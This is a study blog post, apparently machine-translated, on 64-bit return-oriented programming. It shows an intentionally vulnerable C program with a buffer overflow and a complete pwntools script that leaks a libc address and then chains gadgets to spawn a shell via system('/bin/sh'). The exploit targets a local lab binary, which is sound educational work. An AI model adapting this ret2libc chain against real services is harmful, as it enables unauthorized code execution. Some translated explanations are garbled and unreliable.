---
title: "[PWNABLE] ROP 64bit"
description: "※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ In the previous 32-bit, this time we will cover 64-bit. #include void gift(){   asm   (\"pop %r9\");   asm   (\"pop %r8\");   asm    (\"pop %rcx\");   asm   (\"pop %rdx\");"
date: "2023-12-01"
translation_key: "tistory-c12e6171f061"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-ROP64bit"
private: false
---

**※ Please tell us if there is a wrong part. We will fix it after confirmation. *****

In the previous 32-bit, this time we’ll cover 64-bit.

```
#include <stdio.h>

void gift(){
	 __asm__ ("pop %r9");
	__asm__ ("pop %r8");
	__asm__ ("pop %rcx");
	__asm__ ("pop %rdx");
	__asm__ ("pop %rsi");
	__asm__ ("pop %rdi");
	__asm__ ("ret");
	__asm__ ("pop %rax");
   	__asm__ ("ret");
  	__asm__ ("pop %rbx");
 	__asm__ ("ret");
 	__asm__ ("mov %rbx, (%rax)");
 	__asm__ ("ret");
 	__asm__ ("mov %rax, (%rbx)");
 	__asm__ ("ret");
}

int main(){
	char input[0x50];
	puts("Hello! Whrd ");

	read(0,input,0x100);
	return 0 ;
}
```

The following examples have been given only the gadgets.

In 64-bit, you should not forget to use rdi, rsi, rdx, rcx, r8, r9.

Because you need to use the register unlike the previous, there is something to configure the chain

The function that you want to run should be in the register value before running.

Because it should be heard by gadget -> argument -> function.

! [](/assets/images/tistory/tistory-c12e6171f061/001.png)

buf size is 0x50.

32-bit and attacking methods will be easy to think because they are similar.

0x50 + 0x8 + p\ rdi + puts\ got + puts\ plt

! [](/assets/images/tistory/tistory-c12e6171f061/002.png)

The actual address of puts() is output right after main().

After returning to main(), you can save libc\ base because it has the address of the function differently.

You can use this to acquire the shell,

The rest is possible to perform the same bunker as 32-bit.

```
from pwn import *

p = process('./rop64')
e = ELF('./rop64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'debug'

###############################################
p_rdi = 0x0000000000401165
ret = 0x000000000040101a

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.sym['main']

########## Stage 1 : libc_base ################

payload = b'A'*0x50
payload += b'B'*0x8
payload += p64(p_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendafter(b'Whrd',payload)
p.recvn(2)
libc_base = u64(p.recvn(6).ljust(8,b'\x00')) - libc.sym['puts']
print('libc_base = ', hex(libc_base))

########## Stage 2 : attack ## ################

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x50
payload += b'B'*0x8
payload += p64(ret)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendafter(b'Whrd', payload)
p.interactive()
```
